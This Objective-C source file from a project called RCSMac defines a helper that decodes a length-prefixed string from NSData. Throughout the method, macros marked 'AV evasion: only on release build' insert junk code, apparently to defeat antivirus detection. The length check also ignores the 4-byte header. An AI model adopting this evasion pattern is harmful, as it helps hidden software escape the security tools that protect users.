//
//  NSData+Pascal.m
//  RCSMac
//
//  Created by revenge on 1/25/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "NSData+Pascal.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSData (PascalExtension)

- (NSString *)unpascalizeToStringWithEncoding: (NSStringEncoding)encoding
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  int len = 0;
  [self getBytes: &len length: sizeof(int)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (len > [self length])
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      return nil;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString *string = nil;
  
  @try
    {
      NSData *stringData = [self subdataWithRange: NSMakeRange(4, len - 1)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      string = [[NSString alloc] initWithData: stringData
                                     encoding: encoding];
    }
  @catch (NSException *e)
    {
      return nil;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return [string autorelease];
}

@end